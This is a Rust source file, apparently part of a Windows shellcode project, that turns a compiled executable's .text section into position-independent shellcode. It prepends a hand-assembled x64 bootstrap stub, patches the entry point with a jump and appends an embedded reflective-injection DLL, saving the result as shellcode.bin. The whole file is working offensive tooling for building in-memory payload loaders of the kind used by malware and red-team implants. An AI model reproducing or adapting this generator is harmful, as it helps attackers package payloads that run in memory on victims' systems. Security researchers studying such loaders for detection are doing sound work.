use anyhow::Result;
use goblin::pe::PE;
use std::fs::File;
use std::io::prelude::*;
use std::io::BufWriter;

//const DLL: &[u8; 27648] = include_bytes!(r"C:\Windows\System32\calc.exe");
//const DLL: &[u8; 3072] = include_bytes!(r"C:\Users\m0fqn\Documents\GitHub\rust-windows-shellcode\shellcode\kawaii.dll");
const DLL: &[u8; 92160] = include_bytes!(r"C:\Users\m0fqn\Documents\GitHub\ReflectiveDLLInjection\x64\Release\reflective_dll.x64x.dll");

fn main() -> Result<()> {
    let src_path = "shellcode\\target\\x86_64-pc-windows-msvc\\release\\shellcode.exe";
    let mut file = File::open(src_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    let pe = PE::parse(&mut buffer)?;
    let standard_fileds = pe.header.optional_header.unwrap().standard_fields;
    let entry_offset = standard_fileds.address_of_entry_point - standard_fileds.base_of_code;

    for section in pe.sections {
        let name = String::from_utf8(section.name.to_vec())?;
        if !name.starts_with(".text") {
            continue;
        }
        let start = section.pointer_to_raw_data as usize;
        let size = section.size_of_raw_data as usize;
        let dst_path = "shellcode\\target\\x86_64-pc-windows-msvc\\release\\shellcode.bin";
        let shellcode = File::create(dst_path)?;
        let mut bootstrap: Vec<u8> = Vec::new();

        bootstrap.extend_from_slice(b"\xe8\x00\x00\x00\x00");
        bootstrap.push(b'\x59');
        bootstrap.extend_from_slice(b"\x48\x81\xc1\x00\x00\x00\x00");
        bootstrap.push(b'\x56');
        bootstrap.extend_from_slice(b"\x48\x89\xe6");
        bootstrap.extend_from_slice(b"\x48\x83\xec\x28");
        bootstrap.extend_from_slice(b"\x48\x83\xe4\xf0");
        bootstrap.push(b'\xe8');
        bootstrap.push(5 as u8);
        bootstrap.extend_from_slice(b"\x00\x00\x00");
        bootstrap.extend_from_slice(b"\x48\x89\xf4");
        bootstrap.push(b'\x5e');
        bootstrap.push(b'\xc3');

        let dll_offset = bootstrap.len() + size - 5;
        bootstrap[9]  = ((dll_offset >> 0) & 0xFF) as _;
        bootstrap[10] = ((dll_offset >> 8) & 0xFF) as _;
        bootstrap[11] = ((dll_offset >> 16) & 0xFF) as _;
        bootstrap[12] = ((dll_offset >> 24) & 0xFF) as _;

        buffer[0 + start] = 0x90;
        buffer[1 + start] = 0xe9;
        buffer[2 + start] = ((entry_offset >> 0) - 6 & 0xFF) as _;
        buffer[3 + start] = ((entry_offset >> 8) & 0xFF) as _;
        buffer[4 + start] = ((entry_offset >> 16) & 0xFF) as _;
        buffer[5 + start] = ((entry_offset >> 24) & 0xFF) as _;

        let mut buf_writer = BufWriter::new(shellcode);
        for b in bootstrap {
            buf_writer.write(&[b])?;
        }
        for i in start..start + size {
            buf_writer.write(&[buffer[i]])?;
        }
        for b in DLL {
            buf_writer.write(&[*b])?;
        }
        buf_writer.flush().unwrap();
        println!("done! shellcode saved in {}", dst_path);
    }
    Ok(())
}
